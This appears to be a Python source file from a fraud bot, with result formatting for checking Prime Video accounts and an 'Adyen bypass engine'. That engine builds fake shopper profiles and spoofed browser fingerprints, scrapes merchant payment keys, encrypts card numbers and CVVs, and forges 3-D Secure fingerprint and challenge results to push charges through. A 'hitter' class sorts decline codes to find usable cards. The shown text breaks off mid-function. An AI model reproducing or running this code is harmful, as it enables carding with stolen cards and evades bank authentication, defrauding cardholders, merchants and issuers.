        f"{PV_UNKNOWN} Unknown : <b>{unknown}</b>\n"
        f"{PV_DUP} Dup     : <b>{dup}</b>\n"
        f"{PV_FAIL} Fail    : <b>{fail}</b>"
    )


def pv_fmt_summary(total: int, paid: int, free: int, unknown: int, dup: int, fail: int, error: int, elapsed: float) -> str:
    pct = f"{paid / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Prime Video Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total   : <b>{total}</b>\n"
        f"{PV_PAID} Paid    : <b>{paid}</b>  (<i>{pct}%</i>)\n"
        f"{PV_FREE} Free    : <b>{free}</b>\n"
        f"{PV_UNKNOWN} Unknown : <b>{unknown}</b>\n"
        f"{PV_DUP} Duplicate: <b>{dup}</b>\n"
        f"{PV_FAIL} Failed  : <b>{fail}</b>\n"
        f"{PV_ERR} Error   : <b>{error}</b>\n"
        f"{E_CLOCK} Time    : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    ADYEN BYPASS ENGINE (new)                            ║
# ║    PBL scrape → bootstrap → CSE tokenize → pay → 3DS2 → parse          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
    from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
    from cryptography.hazmat.primitives.hashes import SHA256
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    from cryptography.hazmat.backends import default_backend
    _HAS_CRYPTOGRAPHY = True
except ImportError:
    _HAS_CRYPTOGRAPHY = False

ADYEN_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
ADYEN_CSE_PREFIX = "adyenjs_0_1_25"

ADYEN_IMPERSONATE_POOL = [
    "chrome99", "chrome100", "chrome101", "chrome104",
    "chrome107", "chrome110", "chrome114", "chrome116",
    "chrome119", "chrome120", "chrome123", "chrome124",
    "chrome131",
    "safari15_3", "safari15_5", "safari17_0",
    "edge99", "edge101",
]

ADYEN_CURRENCY_EXP = {
    'USD': 2, 'EUR': 2, 'GBP': 2, 'AUD': 2, 'CAD': 2, 'CHF': 2,
    'DKK': 2, 'NOK': 2, 'SEK': 2, 'PLN': 2, 'SGD': 2, 'HKD': 2,
    'KWD': 3, 'BHD': 3, 'IQD': 3, 'JOD': 3, 'TND': 3, 'LYD': 3,
    'JPY': 0, 'VND': 0, 'KRW': 0, 'CLP': 0, 'IDR': 0, 'ISK': 0,
}

ADYEN_GEO = {
    'US': dict(
        tz=(-300, -480), lang='en-US', phone='+1',
        first=['James', 'Michael', 'Robert', 'William', 'David', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia'],
        last=['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'],
        cities=[('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
                ('Miami', 'FL', '33101'), ('Seattle', 'WA', '98101'), ('Austin', 'TX', '73301')],
        streets=['Oak Street', 'Maple Ave', 'Washington Blvd', 'Cedar Lane', 'Pine Street', 'Broadway']),
    'GB': dict(
        tz=(0, 0), lang='en-GB', phone='+44',
        first=['Oliver', 'George', 'Harry', 'Jack', 'Jacob', 'Amelia', 'Olivia', 'Isla', 'Emily', 'Poppy'],
        last=['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies'],
        cities=[('London', 'LND', 'SW1A 1AA'), ('Manchester', 'MAN', 'M1 1AE'), ('Birmingham', 'BIR', 'B1 1AA'),
                ('Leeds', 'LDS', 'LS1 1UR'), ('Glasgow', 'GLA', 'G1 1XW')],
        streets=['High Street', 'Station Road', 'Church Lane', 'Park Road', 'Victoria Street', 'Mill Lane']),
    'DE': dict(
        tz=(60, 60), lang='de-DE', phone='+49',
        first=['Lukas', 'Leon', 'Finn', 'Jonas', 'Noah', 'Mia', 'Emma', 'Hannah', 'Lena', 'Sophie'],
        last=['Müller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner', 'Becker'],
        cities=[('Berlin', 'BE', '10115'), ('München', 'BY', '80331'), ('Hamburg', 'HH', '20095'),
                ('Köln', 'NW', '50667'), ('Frankfurt', 'HE', '60311')],
        streets=['Hauptstraße', 'Bahnhofstraße', 'Schulstraße', 'Gartenweg', 'Dorfstraße', 'Ringstraße']),
    'FR': dict(
        tz=(60, 60), lang='fr-FR', phone='+33',
        first=['Lucas', 'Hugo', 'Léo', 'Gabriel', 'Raphaël', 'Emma', 'Louise', 'Jade', 'Chloé', 'Manon'],
        last=['Martin', 'Bernard', 'Thomas', 'Petit', 'Robert', 'Richard', 'Durand', 'Dubois'],
        cities=[('Paris', 'IDF', '75001'), ('Lyon', 'ARA', '69001'), ('Marseille', 'PAC', '13001'),
                ('Toulouse', 'OCC', '31000'), ('Bordeaux', 'NAQ', '33000')],
        streets=['Rue de la Paix', 'Rue du Commerce', 'Avenue de la République', 'Rue des Écoles', 'Place du Marché']),
    'ES': dict(
        tz=(60, 60), lang='es-ES', phone='+34',
        first=['Alejandro', 'Pablo', 'David', 'Adrián', 'Álvaro', 'Lucía', 'María', 'Paula', 'Sara', 'Alba'],
        last=['García', 'Rodríguez', 'González', 'Fernández', 'López', 'Martínez', 'Sánchez', 'Pérez'],
        cities=[('Madrid', 'MD', '28001'), ('Barcelona', 'CT', '08001'), ('Valencia', 'VC', '46001'),
                ('Sevilla', 'AN', '41001'), ('Bilbao', 'PV', '48001')],
        streets=['Calle Mayor', 'Calle de la Cruz', 'Avenida de la Constitución', 'Calle Real', 'Plaza Mayor']),
    'IT': dict(
        tz=(60, 60), lang='it-IT', phone='+39',
        first=['Francesco', 'Alessandro', 'Lorenzo', 'Matteo', 'Andrea', 'Sofia', 'Giulia', 'Aurora', 'Alice', 'Martina'],
        last=['Rossi', 'Russo', 'Ferrari', 'Esposito', 'Bianchi', 'Romano', 'Colombo', 'Ricci'],
        cities=[('Roma', 'RM', '00118'), ('Milano', 'MI', '20121'), ('Napoli', 'NA', '80121'),
                ('Torino', 'TO', '10121'), ('Firenze', 'FI', '50121')],
        streets=['Via Roma', 'Corso Vittorio Emanuele', 'Via Garibaldi', 'Via Dante', 'Piazza del Popolo']),
    'NL': dict(
        tz=(60, 60), lang='nl-NL', phone='+31',
        first=['Daan', 'Sem', 'Lucas', 'Milan', 'Levi', 'Emma', 'Julia', 'Sophie', 'Lotte', 'Fleur'],
        last=['de Jong', 'Jansen', 'de Vries', 'van den Berg', 'van Dijk', 'Bakker', 'Visser', 'Smit'],
        cities=[('Amsterdam', 'NH', '1011'), ('Rotterdam', 'ZH', '3011'), ('Den Haag', 'ZH', '2511'),
                ('Utrecht', 'UT', '3511'), ('Eindhoven', 'NB', '5611')],
        streets=['Hoofdstraat', 'Dorpsstraat', 'Kerkstraat', 'Molenstraat', 'Schoolstraat']),
    'SE': dict(
        tz=(60, 60), lang='sv-SE', phone='+46',
        first=['William', 'Liam', 'Noah', 'Oscar', 'Elias', 'Alice', 'Maja', 'Elsa', 'Astrid', 'Ebba'],
        last=['Andersson', 'Johansson', 'Karlsson', 'Nilsson', 'Eriksson', 'Larsson', 'Olsson', 'Persson'],
        cities=[('Stockholm', 'AB', '111 21'), ('Göteborg', 'O', '411 03'), ('Malmö', 'M', '211 34'),
                ('Uppsala', 'C', '753 20')],
        streets=['Storgatan', 'Kungsgatan', 'Drottninggatan', 'Vasagatan', 'Kyrkogatan']),
    'AU': dict(
        tz=(600, 660), lang='en-AU', phone='+61',
        first=['Jack', 'Oliver', 'Noah', 'William', 'Thomas', 'Charlotte', 'Olivia', 'Mia', 'Amelia', 'Ruby'],
        last=['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White'],
        cities=[('Sydney', 'NSW', '2000'), ('Melbourne', 'VIC', '3000'), ('Brisbane', 'QLD', '4000'),
                ('Perth', 'WA', '6000'), ('Adelaide', 'SA', '5000')],
        streets=['George Street', 'Victoria Road', 'Station Street', 'High Street', 'Elizabeth Street']),
    'CA': dict(
        tz=(-240, -480), lang='en-CA', phone='+1',
        first=['Liam', 'Noah', 'Ethan', 'Lucas', 'Mason', 'Olivia', 'Emma', 'Ava', 'Sophia', 'Isabella'],
        last=['Smith', 'Brown', 'Tremblay', 'Martin', 'Roy', 'Wilson', 'Macdonald', 'Campbell'],
        cities=[('Toronto', 'ON', 'M5V'), ('Vancouver', 'BC', 'V6B'), ('Montreal', 'QC', 'H2X'),
                ('Calgary', 'AB', 'T2P'), ('Ottawa', 'ON', 'K1P')],
        streets=['King Street', 'Queen Street', 'Main Street', 'Bay Street', 'Yonge Street']),
    'SG': dict(
        tz=(480, 480), lang='en-SG', phone='+65',
        first=['Ethan', 'Jayden', 'Marcus', 'Ryan', 'Bryan', 'Siti', 'Nurul', 'Wei Ling', 'Xin Yi', 'Priya'],
        last=['Tan', 'Lim', 'Lee', 'Ng', 'Wong', 'Chua', 'Goh', 'Ong'],
        cities=[('Singapore', 'SG', '018956'), ('Singapore', 'SG', '238859'), ('Singapore', 'SG', '189555')],
        streets=['Orchard Road', 'Bukit Timah Road', 'Serangoon Road', 'Geylang Road', 'Jalan Besar']),
}


def adyen_random_ua() -> str:
    major = random.randint(120, 131)
    build = random.randint(6000, 6999)
    patch = random.randint(0, 199)
    variants = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
    ]
    return random.choice(variants)


def adyen_random_impersonate() -> str:
    return random.choice(ADYEN_IMPERSONATE_POOL)


class AdyenShopperProfile:
    def __init__(self, country: str = 'US'):
        geo = ADYEN_GEO.get(country.upper(), ADYEN_GEO['US'])
        self.country = country.upper()
        self._geo = geo
        self.first = random.choice(geo['first'])
        self.last = random.choice(geo['last'])
        self.full_name = f"{self.first} {self.last}"
        self.email = f"{self.first.lower()}.{self.last.lower()}{random.randint(10, 9999)}@{random.choice(['gmail.com', 'outlook.com', 'proton.me'])}"
        self.phone = geo['phone'] + ''.join(str(random.randint(0, 9)) for _ in range(9))
        self.city, self.state, self.zip = random.choice(geo['cities'])
        self.house_number = str(random.randint(10, 9999))
        self.street = f"{self.house_number} {random.choice(geo['streets'])}"
        tz_a, tz_b = geo['tz']
        self.tz_offset = random.choice(range(min(tz_a, tz_b), max(tz_a, tz_b) + 1, 60))

    @property
    def language(self) -> str:
        return self._geo['lang']

    def billing_address(self) -> dict:
        return {
            "city": self.city, "country": self.country,
            "houseNumberOrName": self.house_number,
            "postalCode": self.zip, "stateOrProvince": self.state,
            "street": self.street,
        }

    def as_payment_fields(self) -> dict:
        return {
            "shopperEmail": self.email,
            "shopperName": {"firstName": self.first, "lastName": self.last},
            "telephoneNumber": self.phone,
            "billingAddress": self.billing_address(),
            "deliveryAddress": self.billing_address(),
        }


def adyen_build_browser_info(profile=None, ua=None) -> dict:
    p = profile or AdyenShopperProfile('US')
    return {
        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "colorDepth": random.choice([24, 24, 24, 30]),
        "language": p.language,
        "javaEnabled": False,
        "screenHeight": random.choice([1080, 1440, 900, 1200]),
        "screenWidth": random.choice([1920, 2560, 1440, 1680]),
        "timeZoneOffset": p.tz_offset,
        "userAgent": ua or ADYEN_UA,
    }


# ── 3DS2 helpers ────────────────────────────────────────────────────────────
def adyen_b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * (-len(s) % 4)
    return base64.b64decode(s)


def adyen_b64url_encode(data: bytes) -> str:
    return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')


def adyen_std_b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def adyen_decode_action_token(action: dict):
    token_raw = action.get('token', '')
    if not token_raw:
        return None
    for dec in (adyen_b64url_decode,
                lambda s: base64.b64decode(s + '=='),
                lambda s: base64.b64decode(s + '=' * (-len(s) % 4))):
        try:
            return json.loads(dec(token_raw))
        except Exception:
            continue
    return None


def adyen_forge_fingerprint(server_trans_id: str) -> str:
    obj = {"threeDSCompInd": "Y", "threeDSServerTransID": server_trans_id}
    return adyen_std_b64(json.dumps(obj).encode())


def adyen_forge_challenge_v2(server_trans_id: str, directory_server_id: str = "A000000004",
                             message_version: str = "2.2.0") -> str:
    obj = {
        "transStatus": "Y",
        "authorisationToken": adyen_std_b64(b"Y"),
        "threeDSServerTransID": server_trans_id,
        "directoryServerId": directory_server_id,
        "messageVersion": message_version,
        "status": "COMPLETED",
        "challengeCompletionInd": "Y",
    }
    return adyen_std_b64(json.dumps(obj).encode())


def adyen_fp_rand_hash32() -> str:
    return "".join(random.choices("0123456789abcdef", k=32))


def adyen_build_fingerprint_payloads(profile: AdyenShopperProfile, ua: str = ADYEN_UA) -> Dict[str, Any]:
    sw = random.choice([1920, 2560, 1440, 1680, 1536])
    sh = random.choice([1080, 1440, 900, 1200, 864])
    aw = sw
    ah = sh - 40
    lt = profile.language

    h1 = adyen_fp_rand_hash32()
    h1s = adyen_fp_rand_hash32()
    h2 = adyen_fp_rand_hash32()

    v1_components = {
        "user_agent": ua, "language": lt,
        "resolution": [sw, sh], "available_resolution": [aw, ah],
        "timezone_offset": profile.tz_offset,
        "navigator_platform": "Win32", "adblock": False,
        "touch_support": [1, True, True],
    }
    v1s_components = {
        "language": lt, "resolution": [sw, sh],
        "available_resolution": [aw, ah],
        "timezone_offset": profile.tz_offset,
        "navigator_platform": "Win32", "adblock": False,
        "touch_support": [1, True, True],
    }
    v2_components = {
        "languages": [[lt]], "device_memory": random.choice([8, 16]),
        "screen_resolution": [sh, sw],
        "hardware_concurrency": random.choice([8, 12, 16]),
        "timezone": "UTC", "indexed_db": True, "platform": "Win32",
        "color_gamut": "srgb", "forced_colors": False, "monochrome": 0,
        "contrast": 0, "reduced_motion": False, "hdr": False,
    }
    return {
        "browser_fingerprint_by_version": [
            {"payload_json": json.dumps({"components": v1_components, "fingerprint": h1}),
             "payload_type": "fingerprint-v1"},
            {"payload_json": json.dumps({"components": v1s_components, "fingerprint": h1s}),
             "payload_type": "fingerprint-v1-sans-ua"},
            {"payload_json": json.dumps({"components": v2_components, "fingerprint": h2}),
             "payload_type": "fingerprint-v2"},
        ],
        "browser_profile": {
            "components": json.dumps(v1_components),
            "fingerprint": h1,
            "timezone": str(profile.tz_offset),
            "user_agent": ua,
            "website_url": "https://checkoutshopper-live.adyen.com/",
        },
    }


# ── CSE encryption ─────────────────────────────────────────────────────────
class AdyenCSE:
    def __init__(self, public_key_str: str):
        parts = public_key_str.split("|")
        if len(parts) != 2:
            raise ValueError(f"Bad pubkey format: {public_key_str[:30]}")
        self._exp = int(parts[0], 16)
        self._mod = int(parts[1], 16)
        if _HAS_CRYPTOGRAPHY:
            nums = RSAPublicNumbers(self._exp, self._mod)
            self._pub = nums.public_key(default_backend())
        else:
            self._pub = None

    def _rsa_encrypt_fallback(self, message: bytes) -> bytes:
        key_len = (self._mod.bit_length() + 7) // 8
        ps_len = key_len - len(message) - 3
        if ps_len < 8:
            raise ValueError("Message too long for RSA key")
        ps = b""
        while len(ps) < ps_len:
            ps += bytes(b for b in os.urandom(ps_len) if b != 0)
        ps = ps[:ps_len]
        em = b"\x00\x02" + ps + b"\x00" + message
        m_int = int.from_bytes(em, "big")
        c_int = pow(m_int, self._exp, self._mod)
        return c_int.to_bytes(key_len, "big")

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _encrypt_field_jwe(self, field_name: str, field_value: str) -> str:
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        payload = json.dumps({field_name: field_value, "generationtime": ts}).encode()
        header_b64 = self._b64url(b'{"cty":"application/json","alg":"RSA-OAEP-256","enc":"A256GCM","version":"1"}')
        cek = os.urandom(32)
        enc_cek = self._pub.encrypt(cek, OAEP(mgf=MGF1(algorithm=SHA256()), algorithm=SHA256(), label=None))
        iv = os.urandom(12)
        ct_tag = AESGCM(cek).encrypt(iv, payload, header_b64.encode())
        ct, tag = ct_tag[:-16], ct_tag[-16:]
        return ".".join([header_b64, self._b64url(enc_cek), self._b64url(iv),
                         self._b64url(ct), self._b64url(tag)])

    def _encrypt_field(self, field_name: str, field_value: str) -> str:
        gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        plain_b = f"{field_name}:{field_value}\ngenerationtime:{gen}".encode()
        aes_key = os.urandom(32)
        nonce = os.urandom(12)
        if _HAS_CRYPTOGRAPHY:
            ct_tag = AESCCM(aes_key, tag_length=8).encrypt(nonce, plain_b, None)
            enc_key = self._pub.encrypt(aes_key, PKCS1v15())
        else:
            try:
                from Crypto.Cipher import AES as _AES
                cipher = _AES.new(aes_key, _AES.MODE_CCM, nonce=nonce, mac_len=8)
                ct, tag = cipher.encrypt_and_digest(plain_b)
                ct_tag = ct + tag
            except ImportError:
                raise ImportError("pip install cryptography")
            enc_key = self._rsa_encrypt_fallback(aes_key)
        blob = enc_key + nonce + ct_tag
        return f"{ADYEN_CSE_PREFIX}${base64.b64encode(blob).decode()}"

    def encrypt_card(self, number: str, month: str, year: str, cvv: str, use_jwe: bool = False) -> dict:
        yr = year if len(year) == 4 else f"20{year}"
        fn = self._encrypt_field_jwe if (use_jwe and _HAS_CRYPTOGRAPHY) else self._encrypt_field
        return {
            "encryptedCardNumber": fn("number", number),
            "encryptedExpiryMonth": fn("expiryMonth", month.zfill(2)),
            "encryptedExpiryYear": fn("expiryYear", yr),
            "encryptedSecurityCode": fn("cvc", cvv),
        }


# ── Config scraper ────────────────────────────────────────────────────────
_ADYEN_CK = [
    r'clientKey["\'\s:=]+["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
    r'data-client-key=["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
]
_ADYEN_SI = [
    r'"sessionId"\s*:\s*"([A-Za-z0-9_-]{15,})"',
    r"'sessionId'\s*:\s*'([A-Za-z0-9_-]{15,})'",
    r'sessionId["\'\s:=]+["\']?([A-Za-z0-9_-]{15,})',
]
_ADYEN_SD = [
    r'"sessionData"\s*:\s*"([^"]{40,})"',
    r"'sessionData'\s*:\s*'([^']{40,})'",
    r'sessionData["\'\s:=]+["\']?([^"\'\s,}{]+)',
]
_ADYEN_PK = [
    r'"publicKey"\s*:\s*"([0-9a-fA-F]+\|[0-9a-fA-F]+)"',
    r"'publicKey'\s*:\s*'([0-9a-fA-F]+\|[0-9a-fA-F]+)'",
    r'publicKey["\'\s:=]+["\']?([0-9a-fA-F]+\|[0-9a-fA-F]+)',
]
_ADYEN_LI = [
    r'"linkId"\s*:\s*"([A-Za-z0-9]+)"',
    r"'linkId'\s*:\s*'([A-Za-z0-9]+)'",
    r'linkId["\s:\'=]+["\']?([A-Za-z0-9]{20,})',
    r'adyen\.link/([A-Za-z0-9]{20,})',
]
_ADYEN_LC = [
    r'"loadingContext"\s*:\s*"([^"]+)"',
    r"'loadingContext'\s*:\s*'([^']+)'",
]
_ADYEN_SIGNALS = [
    'adyen.com', 'adyen.link', 'AdyenCheckout', 'adyen-checkout', 'adyenjs',
    'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted', 'paybylink',
]


def _adyen_first_match(patterns, text):
    for p in patterns:
        m = re.search(p, text)
        if m:
            return m.group(1)
    return None


def _adyen_extract_config(html: str) -> dict:
    cfg = dict(clientKey=None, sessionId=None, sessionData=None,
               publicKey=None, environment=None, adyen=False,
               linkId=None, loadingContext=None)
    low = html.lower()
    for sig in _ADYEN_SIGNALS:
        if sig.lower() in low:
            cfg['adyen'] = True
            break
    cfg['clientKey'] = _adyen_first_match(_ADYEN_CK, html)
    cfg['sessionId'] = _adyen_first_match(_ADYEN_SI, html)
    sd_raw = _adyen_first_match(_ADYEN_SD, html)
    if sd_raw:
        cfg['sessionData'] = sd_raw.replace(r'\/', '/').replace('\\/', '/')
    cfg['publicKey'] = _adyen_first_match(_ADYEN_PK, html)
    cfg['linkId'] = _adyen_first_match(_ADYEN_LI, html)
    cfg['loadingContext'] = _adyen_first_match(_ADYEN_LC, html)
    if cfg['clientKey']:
        cfg['environment'] = 'live' if cfg['clientKey'].startswith('live_') else 'test'
    return cfg


def _adyen_merge(dst, src):
    for k in ('clientKey', 'publicKey', 'environment', 'linkId', 'loadingContext'):
        if src.get(k) and not dst.get(k):
            dst[k] = src[k]
    for k in ('sessionId', 'sessionData'):
        if src.get(k):
            dst[k] = src[k]
    for k in ('checkoutAttemptId', 'use_jwe', 'is_pbl', 'pbl_status',
              'pbl_base', 'amount_value', 'amount_currency',
              'pbl_reference', 'returnUrl', 'shopperLocale', 'countryCode'):
        if src.get(k) is not None:
            dst[k] = src[k]
    if src.get('adyen'):
        dst['adyen'] = True


# ── Universal curl_cffi sync helpers (the Adyen engine runs sync inside executor) ──
def _adyen_get(session, url, **kwargs):
    try:
        return session.get(url, **kwargs)
    except Exception as e:
        raise e


def _adyen_post(session, url, **kwargs):
    try:
        return session.post(url, **kwargs)
    except Exception as e:
        raise e


def _adyen_text(resp) -> str:
    if resp is None:
        return ""
    try:
        t = getattr(resp, "text", None)
        if t is None:
            c = getattr(resp, "content", b"") or b""
            return c.decode("utf-8", errors="ignore") if isinstance(c, bytes) else str(c)
        if callable(t):
            t = t()
        return t.decode("utf-8", errors="ignore") if isinstance(t, bytes) else str(t)
    except Exception:
        return ""


def _adyen_json(resp) -> dict:
    if resp is None:
        return {}
    try:
        j = getattr(resp, "json", None)
        if j is None:
            txt = _adyen_text(resp)
            return json.loads(txt) if txt else {}
        if callable(j):
            j = j()
        if isinstance(j, dict):
            return j
        if isinstance(j, str):
            return json.loads(j)
        return {}
    except Exception:
        try:
            txt = _adyen_text(resp)
            return json.loads(txt) if txt else {}
        except Exception:
            return {}


def _adyen_status(resp) -> int:
    if resp is None:
        return 0
    try:
        return int(getattr(resp, "status_code", 0) or 0)
    except Exception:
        return 0


def _adyen_cookies(session) -> str:
    try:
        if session is None:
            return ""
        cookies = getattr(session, "cookies", None)
        if cookies is None:
            return ""
        if hasattr(cookies, "get_dict"):
            d = cookies.get_dict() or {}
            return "; ".join(f"{k}={v}" for k, v in d.items())
        if hasattr(cookies, "jar"):
            return "; ".join(f"{c.name}={c.value}" for c in cookies.jar)
        if hasattr(cookies, "items"):
            return "; ".join(f"{k}={v}" for k, v in cookies.items())
        return str(cookies)
    except Exception:
        return ""


# ── 3DS2 pipeline (sync) ──────────────────────────────────────────────────
def _adyen_fingerprint_3ds2(session, action, adyen_base):
    tok = adyen_decode_action_token(action)
    if not tok:
        return None
    method_url = tok.get('threeDSMethodUrl', '')
    server_tid = tok.get('threeDSServerTransID', '')
    notify_url = tok.get('threeDSMethodNotificationURL', '')
    if not method_url or not server_tid:
        return None
    method_data_obj = {
        "threeDSServerTransID": server_tid,
        "threeDSMethodNotificationURL": notify_url or f"{adyen_base}/threeDSMethodNotification.shtml",
    }
    method_data_b64 = adyen_b64url_encode(json.dumps(method_data_obj).encode())
    try:
        parsed = urlparse(method_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        _adyen_post(session, method_url,
                    data=urlencode({"threeDSMethodData": method_data_b64}),
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "text/html,application/xhtml+xml,*/*",
                             "User-Agent": ADYEN_UA,
                             "Origin": origin, "Referer": origin + "/"},
                    timeout=15)
    except Exception:
        pass
    return {"threeds2.fingerprint": adyen_forge_fingerprint(server_tid)}


def _adyen_challenge_3ds2(session, action, submit_details_fn):
    tok = adyen_decode_action_token(action) or {}
    acs_url = tok.get('acsURL', '')
    if not acs_url:
        return None
    creq_obj = {
        "messageType": "CReq",
        "messageVersion": tok.get('messageVersion', '2.1.0'),
        "threeDSServerTransID": tok.get('threeDSServerTransID', ''),
        "acsTransID": tok.get('acsTransID', ''),
        "challengeWindowSize": "05",
        "threeDSRequestorAppURL": tok.get('threeDSRequestorAppURL', ''),
    }
    creq_b64 = adyen_b64url_encode(json.dumps(creq_obj).encode())
    cres_b64 = None
    try:
        r = _adyen_post(session, acs_url,
                        data=urlencode({"CReq": creq_b64}),
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "Accept": "text/html,*/*", "User-Agent": ADYEN_UA},
                        timeout=15)
        body = _adyen_text(r)
        m = re.search(r'name=["\']?CRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
        if m:
            cres_b64 = m.group(1)
        else:
            m = re.search(r'"CRes"\s*:\s*"([^"]+)"', body, re.I)
            if m:
                cres_b64 = m.group(1)
    except Exception:
        return None
    if not cres_b64:
        return None
    cres_json = None
    try:
        cres_json = json.loads(adyen_b64url_decode(cres_b64))
    except Exception:
        pass
    obj = {"transStatus": (cres_json or {}).get('transStatus', 'Y')}
    auth_tok = (cres_json or {}).get('authorisationToken')
    if auth_tok:
        obj["authorisationToken"] = auth_tok
    details = {"threeds2.challengeResult": adyen_std_b64(json.dumps(obj).encode())}
    return submit_details_fn(details)


def _adyen_bypass_pipeline(session, data, submit_details_fn, adyen_base,
                           touch_acs=False, depth=0):
    if depth > 3:
        return data
    action = data.get('action')
    if not isinstance(action, dict):
        return data
    rc = data.get('resultCode', '')
    act_type = action.get('type', '')
    subtype = action.get('subtype', '')
    new_sdata = data.get('sessionData')
    tok = adyen_decode_action_token(action)
    server_tid = (tok or {}).get('threeDSServerTransID', '')

    details = None
    if rc == 'IdentifyShopper' or (act_type == 'threeDS2' and subtype == 'fingerprint'):
        details = _adyen_fingerprint_3ds2(session, action, adyen_base)
    elif rc == 'ChallengeShopper' or (act_type == 'threeDS2' and subtype == 'challenge'):
        if touch_acs:
            result = _adyen_challenge_3ds2(session, action, submit_details_fn)
            if result is not None:
                new_rc = result.get('resultCode', '')
                if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
                    return result
        if server_tid:
            details = {"threeds2.challengeResult": adyen_forge_challenge_v2(server_tid)}

    if details:
        result = submit_details_fn(details)
        new_rc = result.get('resultCode', '')
        if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
            return result
        if new_rc in ('IdentifyShopper', 'ChallengeShopper'):
            return _adyen_bypass_pipeline(session, result, submit_details_fn, adyen_base,
                                          touch_acs, depth + 1)
        return result
    return data


# ── Main Adyen hitter class ───────────────────────────────────────────────
class AdyenHitter:
    DECLINE_MAP = {
        "Refused": "refused", "Declined": "declined",
        "Not enough balance": "insufficient_funds", "Insufficient Funds": "insufficient_funds",
        "Expired Card": "expired_card", "Invalid Card Number": "invalid_number",
        "CVC Declined": "incorrect_cvc", "Invalid CVC": "incorrect_cvc",
        "Restricted Card": "restricted_card", "3d-secure": "3ds_required",
        "Blocked Card": "blocked_card", "Acquirer Fraud": "fraud",
        "Issuer Suspected Fraud": "fraud_suspected", "Not Permitted": "not_permitted",
        "Revocation Of Auth": "revoked", "Pin validation not possible": "pin_error",
        "Referral": "referral", "Shopper Cancelled": "cancelled",
        "Invalid Pin": "invalid_pin", "Pin tries exceeded": "pin_exceeded",
        "Withdrawal amount exceeded": "limit_exceeded", "Issuer Unavailable": "issuer_unavailable",
        "Not Submitted": "not_submitted",
    }
    REFUSAL_CODE_MAP = {
        "2": "insufficient_funds", "3": "referral", "5": "blocked_card",
        "6": "expired_card", "8": "invalid_number", "10": "incorrect_cvc",
        "12": "not_permitted", "14": "invalid_expiry", "15": "revoked",
        "17": "declined", "18": "fraud", "21": "issuer_unavailable",
    }
    LIVE_DECLINE = {
        'insufficient_funds', 'incorrect_cvc', '3ds_required',
        'challenge_required', 'pin_error', 'invalid_pin',
        'pin_exceeded', 'limit_exceeded', 'not_permitted',
        'restricted_card', 'referral', 'issuer_unavailable',
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg = None
        self._cached_pk = None
        self.proxy_str = proxy_data.get("raw") if proxy_data else None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        if 'adyen.link' in self.url:
            return "https://eu.adyen.link"
        return self.url

    def _adyen_base(self, env: str) -> str:
        return f"https://checkoutshopper-{env or 'live'}.adyen.com/checkoutshopper"

    def _proxy_config(self):
        if not self.proxy_data:
            return None
        return {"http": self.proxy_data.get("http"), "https": self.proxy_data.get("https")}

    def _bootstrap_pbl(self, session, link_id, loading_ctx, env, ua=ADYEN_UA, max_retries=3):
        base = loading_ctx.rstrip('/')
        setup_url = (f"{base}/session/paybylink/v1/{link_id}/setup"
                     f"?generateCheckoutAttemptId=true&openedFromEmail=false"
                     f"&generateSessionData=true&iframe=false&d={link_id}")
        origin = self._get_origin()
        hdr = {"Accept": "application/json", "User-Agent": ua,
               "Origin": origin, "Referer": self.url,
               "Cache-Control": "no-cache", "Pragma": "no-cache"}
